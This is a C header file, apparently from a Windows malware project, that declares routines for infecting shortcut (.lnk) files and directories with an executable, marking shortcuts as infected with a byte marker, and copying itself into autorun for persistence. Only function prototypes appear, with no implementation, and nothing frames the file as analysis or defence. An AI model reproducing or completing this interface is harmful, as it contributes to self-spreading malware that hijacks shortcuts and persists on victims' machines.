#ifndef LNK_ARUN_H_INCLUDED
#define LNK_ARUN_H_INCLUDED

#define INFECT_MARKER 0x20,0x20,0x20,0x10,0x0E,0x00

bool IsLnkInfected(TCHAR *lpLink);
void MarkLnkAsInfected(TCHAR *lpLink);
bool InfectLnk(TCHAR *lpLink,TCHAR *lpExe);
bool InfectDirectory(TCHAR *lpDir,TCHAR *lpExe);
void MakeMeArun(TCHAR *lpExe);

void AddSelfBodyToAutorunAsLink();

#endif // LNK_ARUN_H_INCLUDED
